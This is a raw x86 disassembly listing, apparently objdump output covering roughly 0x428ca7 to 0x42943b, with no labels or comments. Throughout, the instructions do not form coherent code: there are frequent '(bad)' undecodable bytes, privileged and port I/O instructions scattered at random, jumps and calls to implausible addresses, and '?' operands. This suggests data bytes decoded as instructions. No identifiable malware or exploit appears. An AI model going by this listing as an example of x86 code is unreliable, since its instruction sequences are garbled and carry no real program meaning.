  428ca7:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428cad:	or     ah,al
  428caf:	pop    ss
  428cb0:	cdq    
  428cb1:	push   ebp
  428cb2:	clc    
  428cb3:	mov    eax,DWORD PTR [ebp-0x4]
  428cb6:	xor    edx,edx
  428cb8:	add    esi,DWORD PTR [ebx]
  428cba:	cmp    eax,DWORD PTR [ebx]
  428cbc:	hlt    
  428cbd:	cmp    DWORD PTR [ebx],esp
  428cbf:	or     al,BYTE PTR [ebp+0xf]
  428cc2:	mov    eax,DWORD PTR [edx]
  428cc4:	loopne 0x428cc6
  428cc6:	(bad)  
  428cc7:	mov    ecx,esi
  428cc9:	cld    
  428cca:	pushf  
  428ccb:	pop    ebp
  428ccc:	cwde   
  428ccd:	mov    esi,DWORD PTR [edx]
  428ccf:	lock mov eax,eax
  428cd2:	adc    BYTE PTR [ebx],al
  428cd4:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428cdb:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428ce1:	dec    ebp
  428ce2:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428ce8:	(bad)  
  428ce9:	iret   
  428cea:	inc    ebp
  428ceb:	(bad)  
  428cec:	jne    0x428d3b
  428cee:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428cf4:	(bad)  
  428cf5:	cmp    ebx,eax
  428cf7:	je     0x428c7f
  428cf9:	add    edi,edi
  428cfb:	or     bh,bh
  428cfd:	dec    ebp
  428cfe:	inc    ebp
  428cff:	mov    esi,DWORD PTR [ebx]
  428d01:	cld    
  428d02:	add    ecx,esi
  428d04:	cmp    ecx,DWORD PTR [eax-0xc]
  428d07:	mov    edx,DWORD PTR [edi]
  428d09:	or     BYTE PTR [ebp-0x7c],al
  428d0c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428d12:	test   BYTE PTR [eax+ebx*4],cl
  428d15:	inc    ebp
  428d16:	xor    bh,BYTE PTR ds:0x8be89c89
  428d1c:	out    dx,eax
  428d1d:	adc    BYTE PTR [eax],al
  428d1f:	jne    0x428ce8
  428d21:	mov    ebp,esp
  428d23:	fcomp  DWORD PTR [ebx]
  428d25:	add    BYTE PTR [ecx],al
  428d27:	inc    DWORD PTR [ebp-0x75]
  428d2a:	mov    ?,esp
  428d2c:	add    al,0xce
  428d2e:	mov    ecx,edi
  428d30:	cld    
  428d31:	inc    ebp
  428d32:	fidivr WORD PTR [ebx]
  428d34:	fbstp  TBYTE PTR [ebp-0x3e]
  428d37:	mov    eax,DWORD PTR [eax]
  428d39:	adc    BYTE PTR [ebx-0x3974038b],cl
  428d3f:	fadd   st,st(7)
  428d41:	add    BYTE PTR [ebp-0x1],al
  428d44:	mov    ecx,DWORD PTR [esp+edi*8]
  428d47:	inc    ebp
  428d48:	mov    bh,0xc7
  428d4b:	loopne 0x428d92
  428d4d:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428d53:	add    DWORD PTR [ebx],esi
  428d55:	pushf  
  428d56:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428d5c:	mov    eax,edi
  428d5e:	cwde   
  428d5f:	inc    ebp
  428d60:	inc    ebp
  428d61:	jne    0x428cee
  428d63:	mov    esp,esp
  428d65:	clc    
  428d66:	add    al,0x4d
  428d68:	mov    DWORD PTR [ebx],esi
  428d6a:	or     al,0x33
  428d6c:	inc    ebp
  428d6d:	lea    ecx,[ebx-0x398d13fd]
  428d73:	add    bh,al
  428d75:	inc    ebp
  428d76:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428d7d:	add    ebp,esp
  428d7f:	shufps xmm1,xmm3,0xc7
  428d83:	(bad)  
  428d84:	jmp    0x7487c8ad
  428d89:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428d8f:	hlt    
  428d90:	mov    ecx,DWORD PTR [edi]
  428d92:	fadd   DWORD PTR [ebp+0x0]
  428d95:	xor    ecx,DWORD PTR [edi]
  428d97:	add    ecx,ecx
  428d99:	cmp    edi,edi
  428d9b:	pmuludq mm7,QWORD PTR [edx+0x50]
  428d9f:	(bad)  
  428da0:	jmp    0x428d2d
  428da2:	mov    edi,esp
  428da4:	or     al,0xc6
  428da6:	inc    ebp
  428da7:	(bad)  
  428da8:	mov    eax,DWORD PTR [ebp+0x10]
  428dab:	jne    0x428d36
  428dad:	mov    eax,DWORD PTR [ecx]
  428daf:	clc    
  428db0:	add    BYTE PTR [ebp-0x40],cl
  428db3:	xor    edx,DWORD PTR [eax-0x73]
  428db6:	jne    0x428db9
  428db8:	push   DWORD PTR [edx+0x8]
  428dbb:	add    BYTE PTR [ebp+0x45],al
  428dbe:	mov    ebp,ecx
  428dc0:	cld    
  428dc1:	add    BYTE PTR [ebp+0x0],cl
  428dc4:	xor    eax,DWORD PTR [ebp+0x3]
  428dc7:	mov    al,0x3b
  428dc9:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  428dcf:	sub    eax,0x5d330e4d
  428dd4:	lea    esi,[ebx]
  428dd6:	add    DWORD PTR [ebx],eax
  428dd8:	jb     0x428dc3
  428dda:	add    BYTE PTR [eax],al
  428ddc:	inc    ebp
  428ddd:	add    bl,ch
  428ddf:	inc    ebp
  428de0:	mov    esi,DWORD PTR [ebx]
  428de2:	or     al,0x3
  428de4:	(bad)  
  428de5:	mov    edi,eax
  428de7:	in     al,dx
  428de8:	scas   eax,DWORD PTR es:[edi]
  428de9:	inc    ebp
  428dea:	mov    esi,DWORD PTR [ebx]
  428dec:	in     al,0x3
  428dee:	add    al,0x89
  428df0:	mov    ecx,DWORD PTR [eax+edi*8]
  428df3:	dec    ebp
  428df4:	(bad)  
  428df5:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  428dfc:	mov    ecx,eax
  428dfe:	cld    
  428dff:	push   es
  428e00:	dec    ebp
  428e01:	add    al,0x33
  428e03:	mov    DWORD PTR [ebx],eax
  428e05:	in     al,dx
  428e06:	cmp    DWORD PTR [ebp-0x67],eax
  428e09:	mov    eax,DWORD PTR [ebp-0xba0068]
  428e0f:	mov    edx,DWORD PTR [ebp-0x4]
  428e12:	mov    ecx,DWORD PTR [ebp-0x18]
  428e15:	xor    ecx,DWORD PTR [ebp+0x3]
  428e18:	cmp    DWORD PTR [ebx],0x8b327497
  428e1e:	xor    edi,esp
  428e20:	jmp    0xff768b72
  428e25:	add    ecx,DWORD PTR [ebp-0x3f]
  428e28:	xor    ebx,DWORD PTR [edi]
  428e2a:	add    eax,ecx
  428e2c:	cmp    ebx,DWORD PTR [eax]
  428e2e:	mov    ecx,DWORD PTR [ebp-0x4]
  428e31:	mov    ecx,DWORD PTR [eax]
  428e33:	adc    BYTE PTR [ebp-0x80],al
  428e36:	jmp    0x428e39
  428e38:	mov    eax,DWORD PTR [eax]
  428e3a:	cld    
  428e3b:	mov    bh,0xc6
  428e3d:	push   ecx
  428e3e:	(bad)  
  428e3f:	jne    0x428e9f
  428e41:	dec    ecx
  428e43:	or     BYTE PTR [ecx+ebx*1],cl
  428e46:	push   ebp
  428e47:	inc    ebp
  428e48:	in     al,dx
  428e49:	add    ebp,esp
  428e4b:	or     bh,al
  428e4d:	dec    ebp
  428e4e:	cld    
  428e4f:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  428e55:	cmp    DWORD PTR [ecx],0x2
  428e58:	pushf  
  428e59:	dec    DWORD PTR [ebx+0x45510cf4]
  428e5f:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  428e65:	mov    edx,DWORD PTR [ecx+0xc]
  428e68:	xor    eax,esi
  428e6a:	mov    edx,0xc172c7
  428e6f:	inc    ebp
  428e70:	mov    esi,DWORD PTR [ebp+0x8]
  428e73:	mov    eax,edx
  428e75:	call   0x84c7556a
  428e7a:	add    DWORD PTR [eax-0x76bace00],ebx
  428e80:	mov    ebp,eax
  428e82:	or     BYTE PTR [eax],dl
  428e84:	jo     0x428ed3
  428e86:	push   edi
  428e87:	xor    esi,DWORD PTR [ebp+0x3]
  428e8a:	(bad)  
  428e8b:	pmulhuw mm0,mm1
  428e8e:	test   DWORD PTR [ebp-0x8],ecx
  428e91:	mov    DWORD PTR [ebp-0x67],eax
  428e94:	mov    eax,DWORD PTR [ebp-0x4]
  428e97:	xor    edi,DWORD PTR [ebp-0x73]
  428e9a:	xor    eax,DWORD PTR [ebx]
  428e9c:	xor    esi,DWORD PTR [edx+0x3]
  428e9f:	add    BYTE PTR [ecx],bh
  428ea1:	inc    ebp
  428ea2:	(bad)  
  428ea3:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428ea9:	mov    DWORD PTR [eax],0x750f0004
  428eaf:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428eb5:	lock add BYTE PTR [ebp+0x0],al
  428eb9:	mov    esi,DWORD PTR [ebp-0x2c]
  428ebc:	mov    ebp,edx
  428ebe:	or     al,0x72
  428ec0:	ja     0x428ec2
  428ec2:	mov    edx,esi
  428ec4:	cld    
  428ec5:	(bad)  
  428ec8:	cli    
  428ec9:	mov    esi,DWORD PTR [ebp-0x4]
  428ecc:	cmp    ecx,esi
  428ece:	bswap  edi
  428ed0:	(bad)
  428ed4:	mov    esi,DWORD PTR [ebp-0x4]
  428ed7:	mov    esi,ecx
  428ed9:	clc    
  428eda:	repnz add esi,DWORD PTR [ebp+0x45]
  428ede:	push   ebx
  428edf:	xor    eax,DWORD PTR [ebp+0x3]
  428ee2:	cmp    ebx,DWORD PTR [edi-0x64]
  428ee5:	pop    ebx
  428ee6:	jmp    0x428fad
  428eeb:	mov    esi,DWORD PTR [ebp-0x7d]
  428eee:	xor    ebp,DWORD PTR [eax]
  428ef0:	lea    eax,[ebp-0x8]
  428ef3:	cmp    dl,dh
  428ef5:	pushf  
  428ef6:	out    dx,eax
  428ef7:	(bad)  
  428ef8:	neg    eax
  428efa:	ins    DWORD PTR es:[edi],dx
  428efb:	test   esi,edi
  428efd:	clc    
  428efe:	pop    esp
  428eff:	inc    ebp
  428f00:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428f06:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428f0c:	add    cl,al
  428f0e:	jne    0x428ea8
  428f10:	mov    esi,DWORD PTR [edx]
  428f12:	in     al,dx
  428f13:	push   esi
  428f14:	xor    BYTE PTR [ebp-0xe],dh
  428f17:	add    edi,esi
  428f19:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428f1f:	add    cl,bh
  428f21:	mov    edi,DWORD PTR [ebp+0x8]
  428f24:	mov    DWORD PTR [ebp-0x14],esi
  428f27:	add    esi,DWORD PTR [ebp+0x3c]
  428f2a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428f30:	mov    ah,0x3d
  428f32:	cwde   
  428f33:	pushf  
  428f34:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428f3a:	jne    0x428ec7
  428f3c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428f3f:	icebp  
  428f40:	icebp  
  428f41:	shl    edx,0xf2
  428f44:	(bad)  
  428f45:	mov    ah,0x16
  428f47:	cmp    BYTE PTR [ebp-0x6d],dh
  428f4a:	mov    ecx,DWORD PTR [edi]
  428f4c:	in     al,dx
  428f4d:	jmp    0x428f40
  428f4f:	add    dl,dh
  428f51:	mov    edi,esi
  428f53:	or     al,0x8
  428f55:	inc    ebp
  428f56:	jne    0x428f5b
  428f58:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428f5e:	ret    
  428f5f:	or     bh,bh
  428f61:	jge    0x428f4b
  428f63:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428f69:	xor    edi,eax
  428f6b:	add    esi,DWORD PTR [ebp-0x77]
  428f6e:	mov    ebx,esp
  428f70:	clc    
  428f71:	neg    DWORD PTR [ebp-0x7c]
  428f74:	xor    eax,DWORD PTR [eax]
  428f76:	cmp    eax,DWORD PTR [eax]
  428f78:	repz jne 0x428f10
  428f7b:	xor    eax,DWORD PTR [ecx]
  428f7d:	add    ebx,DWORD PTR [eax]
  428f7f:	mov    DWORD PTR [ebp-0x8],eax
  428f82:	mov    eax,edi
  428f84:	cld    
  428f85:	lock pop eax
  428f87:	test   DWORD PTR [ebx],esi
  428f89:	clc    
  428f8a:	add    edx,DWORD PTR [edi-0x740bff77]
  428f90:	fdivp  st(4),st
  428f92:	test   ecx,esi
  428f94:	(bad)  
  428f95:	jnp    0x428f96
  428f97:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428f9d:	jae    0x428f2a
  428f9f:	sub    edi,esp
  428fa1:	(bad)  
  428fa2:	shl    DWORD PTR [eax-0x3e],0x89
  428fa6:	leave  
  428fa7:	call   0x819846b4
  428fac:	in     al,dx
  428fad:	(bad)  
  428fae:	in     al,dx
  428faf:	add    bh,al
  428fb1:	mov    esp,edi
  428fb3:	in     al,dx
  428fb4:	test   DWORD PTR [ebp-0x8],edi
  428fb7:	mov    eax,DWORD PTR [ebp+0x2b]
  428fba:	cmp    DWORD PTR [ebx],eax
  428fbc:	pushf  
  428fbd:	jnp    0x57318bf6
  428fc3:	xor    edx,DWORD PTR [eax-0x77]
  428fc6:	push   ecx
  428fc7:	loopne 0x428ffc
  428fc9:	jne    0x428f86
  428fcb:	mov    esi,DWORD PTR [edx-0x20]
  428fce:	add    BYTE PTR [ebp-0x3d],bh
  428fd1:	xor    eax,DWORD PTR [ebp-0x73]
  428fd4:	mov    edi,DWORD PTR [esi]
  428fd6:	cld    
  428fd7:	jb     0x428f9f
  428fd9:	add    bl,al
  428fdb:	jne    0x429022
  428fdd:	mov    edx,DWORD PTR [edi-0x10]
  428fe0:	jge    0x42905f
  428fe2:	mov    esi,DWORD PTR [ebx]
  428fe4:	lock add ecx,DWORD PTR [ebp+0x3b]
  428fe8:	xor    esi,DWORD PTR [ebp-0x77]
  428feb:	mov    esi,eax
  428fed:	lock inc ebp
  428fef:	jge    0x429029
  428ff1:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  428ff8:	dec    ebp
  428ff9:	mov    esi,DWORD PTR [ebx]
  428ffb:	loopne 0x428f86
  428ffd:	jge    0x428ff7
  428fff:	add    DWORD PTR [ebp-0x7d],eax
  429002:	clc    
  429003:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42900a:	dec    ebp
  42900b:	hlt    
  42900c:	xor    ebx,DWORD PTR [ebp-0x77]
  42900f:	mov    esi,esp
  429011:	in     al,0x45
  429013:	jge    0x429051
  429015:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42901c:	dec    ebp
  42901d:	cmp    al,0x33
  42901f:	xchg   ebx,eax
  429020:	mov    DWORD PTR [ebx-0x14],esi
  429023:	add    eax,DWORD PTR [ebp-0xc]
  429026:	cmp    BYTE PTR [ebp-0x61],dh
  429029:	mov    edi,DWORD PTR [eax+0xf19504]
  42902f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429033:	cmp    eax,DWORD PTR [ebp+0xf]
  429036:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42903a:	fistp  WORD PTR [ebx+0x0]
  42903d:	inc    ebp
  42903e:	mov    ebx,DWORD PTR [edi+0xc]
  429041:	add    eax,eax
  429043:	inc    ebp
  429044:	test   BYTE PTR [ebx],dh
  429046:	add    eax,DWORD PTR [ebx]
  429048:	add    BYTE PTR [esi+0x45],bl
  42904b:	ret    0x85
  42904e:	jnp    0x5443141d
  429054:	inc    bp
  429056:	inc    ebp
  429057:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  42905d:	fdiv   QWORD PTR [ebx]
  42905f:	test   DWORD PTR [ecx+0x453af8],edi
  429065:	push   ebx
  429066:	add    edi,DWORD PTR [esi+0x708088b]
  42906c:	cmp    esi,eax
  42906e:	sets   BYTE PTR [ecx-0x74fcffce]
  429075:	mov    esp,edi
  429077:	call   0x33cdd5c9
  42907c:	or     BYTE PTR [ebx],al
  42907e:	inc    ecx
  42907f:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  429085:	and    BYTE PTR [ebp-0x7074f0bb],al
  42908b:	lock add cl,al
  42908e:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  429095:	mov    ch,0x45
  429097:	clc    
  429098:	xor    eax,DWORD PTR [ebp+0x3]
  42909b:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4290a1:	inc    ebp
  4290a2:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4290a8:	mov    edi,eax
  4290aa:	mov    eax,DWORD PTR [ebp+0x3c]
  4290ad:	mov    ecx,DWORD PTR [eax]
  4290af:	hlt    
  4290b0:	inc    ebp
  4290b1:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4290b8:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4290be:	push   ebp
  4290bf:	mov    edi,DWORD PTR [ebx]
  4290c1:	in     al,dx
  4290c2:	jne    0x429085
  4290c4:	mov    eax,DWORD PTR [ebp-0x28]
  4290c7:	add    DWORD PTR [eax],0xe8058dec
  4290cd:	clc    
  4290ce:	mov    esp,DWORD PTR [edi-0x8]
  4290d1:	add    dh,dl
  4290d3:	rol    WORD PTR [ebp-0x1],cl
  4290d7:	mov    edx,DWORD PTR [eax+0x8]
  4290da:	jne    0x42909c
  4290dc:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4290e3:	inc    ebp
  4290e4:	push   esp
  4290e5:	test   DWORD PTR [ecx+0xf],ecx
  4290e8:	sub    edx,esp
  4290ea:	add    eax,DWORD PTR [eax]
  4290ec:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4290f2:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4290f9:	mov    eax,DWORD PTR [ecx]
  4290fb:	and    BYTE PTR [eax],al
  4290fd:	adc    BYTE PTR ss:[eax],al
  429100:	inc    ebp
  429101:	inc    cx
  429104:	push   esp
  429105:	cld    
  429106:	jne    0x429108
  429108:	push   edx
  429109:	enterw 0xc1,0x4d
  42910e:	mov    esp,DWORD PTR [esi+0x20]
  429111:	add    DWORD PTR [ecx-0x7b],eax
  429114:	add    eax,DWORD PTR [ebx]
  429116:	str    WORD PTR [eax+0x45]
  42911a:	lea    ecx,[ebx+0x45890801]
  429120:	sbb    BYTE PTR [ebx],al
  429122:	dec    ebp
  429123:	cmp    al,0xf
  429125:	inc    ebp
  429126:	push   eax
  429127:	mov    esi,DWORD PTR [ebx]
  429129:	push   eax
  42912a:	add    eax,eax
  42912c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429133:	inc    ebp
  429134:	add    BYTE PTR [eax],bh
  429136:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42913d:	(bad)  
  42913e:	mov    ebx,eax
  429140:	loopne 0x429187
  429142:	dec    ebp
  429143:	mov    ecx,DWORD PTR [edi]
  429145:	cld    
  429146:	push   eax
  429147:	xchg   DWORD PTR [ebx],esi
  429149:	add    DWORD PTR [ebx],ebp
  42914b:	add    BYTE PTR [ebx],ch
  42914d:	or     BYTE PTR [ecx],bh
  42914f:	dec    ecx
  429150:	loopne 0x429155
  429152:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  429158:	push   ebp
  429159:	add    DWORD PTR [ebx+0x55100800],eax
  42915f:	dec    ebp
  429160:	jmp    0x4290eb
  429162:	mov    esp,DWORD PTR [eax]
  429164:	sbb    dl,dl
  429166:	inc    eax
  429167:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42916d:	add    BYTE PTR [ebx+0x74528555],cl
  429173:	push   ebp
  429174:	div    DWORD PTR [ebx]
  429176:	and    eax,DWORD PTR [ebx]
  429178:	add    edx,DWORD PTR [edx-0x30]
  42917b:	jno    0x429108
  42917d:	inc    DWORD PTR [eax+eiz*1]
  429180:	inc    ebp
  429181:	push   eax
  429182:	push   eax
  429183:	mov    esp,DWORD PTR [edi-0x74beff1c]
  429189:	mov    edi,esp
  42918b:	push   eax
  42918c:	inc    ebp
  42918d:	enter  0x458b,0x8
  429191:	push   ecx
  429192:	(bad)  
  429193:	call   0x10c9b6b
  429198:	pop    ss
  429199:	push   ebp
  42919a:	mov    ecx,DWORD PTR [ebx+0x489408]
  4291a0:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4291a6:	push   ecx
  4291a7:	jo     0x429191
  4291a9:	inc    DWORD PTR [edi]
  4291ab:	or     BYTE PTR [eax],al
  4291ad:	call   0xcd98f7
  4291b2:	fmul   QWORD PTR [ebp+0x55]
  4291b5:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4291bb:	mov    bh,0x8c
  4291bd:	adc    al,0x98
  4291bf:	dec    esp
  4291c0:	xor    bl,BYTE PTR [eax]
  4291c2:	mov    ecx,DWORD PTR [ebp+0xc]
  4291c5:	mov    eax,DWORD PTR [ebp-0x4]
  4291c8:	mov    esi,DWORD PTR [edi-0x3148f924]
  4291ce:	push   es
  4291cf:	retf   
  4291d0:	mov    BYTE PTR [ebp-0x30],0x3b
  4291d4:	inc    ebp
  4291d5:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4291dc:	retf   0x83fc
  4291df:	into   
  4291e0:	dec    ebp
  4291e1:	retf   
  4291e2:	mov    ecx,DWORD PTR [ebp-0x74]
  4291e5:	mov    eax,DWORD PTR [eax]
  4291e7:	fdiv   QWORD PTR [ebx]
  4291e9:	mov    bh,0x3
  4291eb:	push   es
  4291ec:	mov    esi,ecx
  4291ee:	sbb    cl,dl
  4291f0:	dec    ebp
  4291f1:	sar    DWORD PTR [ebx],cl
  4291f3:	push   ebp
  4291f4:	jne    0x429205
  4291f6:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4291fc:	lea    ebx,[eax]
  4291fe:	call   0xf4cc1dc5
  429203:	sbb    dh,dl
  429205:	add    edx,ebx
  429207:	push   ebp
  429208:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42920e:	push   ecx
  42920f:	mov    DWORD PTR [eax-0x30],edx
  429212:	test   DWORD PTR [edx],eax
  429214:	xadd   esp,esi
  429217:	pop    es
  429218:	add    cl,dl
  42921a:	mov    eax,ecx
  42921c:	or     al,0x45
  42921e:	(bad)  
  42921f:	push   eax
  429220:	add    DWORD PTR [edx+0x0],eax
  429223:	add    ecx,DWORD PTR [ecx]
  429225:	and    dh,cl
  429227:	call   0xc69af7
  42922c:	add    DWORD PTR [ebp+0x0],edx
  42922f:	mov    esp,DWORD PTR [ebp+0x18]
  429232:	add    BYTE PTR [eax+0x44],cl
  429235:	xor    eax,DWORD PTR [eax]
  429237:	add    esp,DWORD PTR [esi+0x3b]
  42923a:	inc    ebp
  42923b:	je     0x4291c0
  42923d:	push   ecx
  42923e:	or     cl,BYTE PTR [ebp-0x77]
  429241:	add    eax,esi
  429243:	or     al,0x5e
  429245:	inc    eax
  429246:	add    BYTE PTR [ebx],al
  429248:	data16 and BYTE PTR [ebp+0x50],al
  42924c:	sub    DWORD PTR [ecx],0xffffffe8
  42924f:	add    BYTE PTR [ebp-0x75],ah
  429252:	add    BYTE PTR [eax],bl
  429254:	enter  0x894d,0x8b
  429258:	int3   
  429259:	loopne 0x42928d
  42925b:	rol    BYTE PTR [eax],0x33
  42925e:	lea    cx,[ebp+0xa]
  429262:	data16 jb 0x4292aa
  429265:	add    BYTE PTR [ebx+0x44890855],cl
  42926b:	sbb    ah,al
  42926d:	inc    ebp
  42926e:	lldt   WORD PTR ss:[edx+0x66]
  429273:	xor    ecx,DWORD PTR [eax]
  429275:	sub    edi,esp
  429277:	mov    eax,DWORD PTR [eax]
  429279:	or     al,0x66
  42927b:	ror    edx,cl
  42927d:	dec    ebp
  42927e:	inc    ebp
  42927f:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  429285:	cld    
  429286:	or     BYTE PTR [edi+0x4501dd],dl
  42928c:	(bad)  
  42928d:	into   
  42928e:	out    dx,al
  42928f:	retf   
  429290:	(bad)  
  429291:	dec    ebp
  429292:	mov    al,0x8b
  429294:	jmp    0xea27:0x450ac320
  42929b:	xchg   esi,ebp
  42929d:	add    edi,eax
  42929f:	add    BYTE PTR [eax+0x3f52e955],bh
  4292a5:	push   ebp
  4292a6:	inc    ebp
  4292a7:	xor    ebx,esp
  4292a9:	add    ebp,esi
  4292ab:	push   edx
  4292ac:	push   bp
  4292ae:	inc    ebp
  4292af:	(bad)  
  4292b0:	in     eax,dx
  4292b1:	push   esp
  4292b2:	(bad)  
  4292b3:	inc    edx
  4292b5:	sbb    al,0x33
  4292b7:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4292be:	add    BYTE PTR [ebp+0x43],0x8b
  4292c2:	jmp    0xf98b:0x100041c8
  4292c9:	xor    esi,DWORD PTR [edx+0x3]
  4292cc:	mov    ecx,DWORD PTR [edi]
  4292ce:	fmul   DWORD PTR [edx]
  4292d0:	add    BYTE PTR [eax],al
  4292d2:	lea    eax,[ebx-0x4700273c]
  4292d8:	add    al,0x4f
  4292da:	pop    DWORD PTR [eax]
  4292dc:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4292e2:	push   edx
  4292e3:	inc    WORD PTR [ebp+0x8]
  4292e7:	mov    eax,0x514f4d
  4292ec:	(bad)
  4292f0:	add    al,al
  4292f2:	xor    DWORD PTR [ebx-0x74baf730],eax
  4292f8:	test   DWORD PTR [esi+0x74],esp
  4292fb:	inc    ebp
  4292fc:	mov    DWORD PTR [eax+0xa4f08],edi
  429302:	add    BYTE PTR [ecx-0x76c435bb],cl
  429308:	or     dh,cl
  42930a:	or     eax,0x8b8d5045
  42930f:	inc    ebp
  429310:	mov    WORD PTR [ecx+0x3b8a00],?
  429316:	jne    0x42934b
  429318:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42931e:	add    DWORD PTR [ebx],eax
  429320:	add    bh,bh
  429322:	adc    DWORD PTR [eax],ecx
  429324:	adc    DWORD PTR [ebp+0x55],edi
  429327:	push   es
  429328:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42932e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429335:	inc    ebp
  429336:	mov    esp,edi
  429338:	or     al,0xdc
  42933a:	push   eax
  42933b:	(bad)  
  42933c:	jne    0x4292f2
  42933e:	call   0x3a8c2f
  429343:	inc    ebp
  429344:	rol    dl,0x84
  429347:	out    dx,al
  429348:	add    bh,al
  42934a:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429351:	(bad)  
  429352:	and    al,al
  429354:	fs in  eax,dx
  429356:	inc    DWORD PTR [ebp-0x7b]
  429359:	js     0x42936a
  42935b:	leave  
  42935c:	scas   al,BYTE PTR es:[edi]
  42935d:	inc    esp
  42935e:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  429365:	or     BYTE PTR [ebx-0x97717c5],0x83
  42936c:	call   DWORD PTR [edi]
  42936e:	shr    ah,0x84
  429371:	xchg   DWORD PTR [eax],eax
  429373:	add    DWORD PTR [eax],eax
  429375:	add    bh,bh
  429377:	dec    ebp
  429378:	and    BYTE PTR [ecx-0x38],dl
  42937b:	push   eax
  42937c:	dec    DWORD PTR [ebx+0xfd885]
  429382:	mov    BYTE PTR [ebp+0x508bac00],cl
  429388:	mov    WORD PTR [ecx+0x0],ss
  42938b:	lea    ecx,[ebx+0x108b20d8]
  429391:	mov    WORD PTR [edx],ds
  429393:	add    BYTE PTR [edi+0xff01ff],al
  429399:	mov    ecx,DWORD PTR [ebp-0x28]
  42939c:	push   ecx
  42939d:	shl    BYTE PTR [ebp+0x3a],0x8b
  4293a1:	inc    ebp
  4293a2:	in     al,0xeb
  4293a4:	jno    0x429331
  4293a6:	push   edx
  4293a7:	mov    DWORD PTR [eax-0x28],edx
  4293aa:	mov    eax,DWORD PTR [ebp+0x20]
  4293ad:	je     0x429336
  4293af:	mov    eax,DWORD PTR [ecx]
  4293b1:	sbb    BYTE PTR [eax],al
  4293b3:	pop    DWORD PTR [eax]
  4293b5:	add    esi,eax
  4293b7:	add    bl,al
  4293b9:	adc    DWORD PTR [edi],esi
  4293bb:	jmp    0x8bcde40d
  4293c0:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  4293c7:	jne    0x429354
  4293c9:	mov    ecx,DWORD PTR [eax]
  4293cb:	in     al,0x75
  4293cd:	pop    DWORD PTR [ecx+0x5001]
  4293d3:	push   edx
  4293d4:	inc    DWORD PTR [ebx]
  4293d6:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4293dc:	add    BYTE PTR [edi+0x9],dl
  4293df:	call   DWORD PTR [esi]
  4293e1:	and    dl,al
  4293e3:	and    bh,bh
  4293e5:	inc    edi
  4293e7:	test   eax,edx
  4293e9:	sldt   ebx
  4293ec:	cmp    DWORD PTR [eax],eax
  4293ee:	pushf  
  4293ef:	(bad)  
  4293f0:	jmp    0x4293fe
  4293f2:	mov    eax,edi
  4293f4:	or     al,0x75
  4293f6:	inc    eax
  4293f7:	call   0x428aff
  4293fc:	mov    eax,eax
  4293fe:	loopne 0x429384
  429400:	inc    ebp
  429401:	add    BYTE PTR [ebx+0x1451c00],cl
  429407:	mov    eax,DWORD PTR [ebp+0x20]
  42940a:	add    edi,ecx
  42940c:	add    BYTE PTR [eax],ch
  42940e:	cmp    edi,0x18
  429411:	test   DWORD PTR [ebp+0xf],esi
  429414:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42941b:	jne    0x42941f
  42941d:	call   0xffa18ee2
  429422:	leave  
  429423:	rcr    BYTE PTR [esp+eax*4],0x55
  429427:	add    ah,ch
  429429:	add    BYTE PTR [edi-0x48fef979],dh
  42942f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429436:	inc    esp
  429437:	mov    ebx,DWORD PTR [eax]
  429439:	fcom   st(2)
  42943b:	add    BYTE PTR [edi],bl
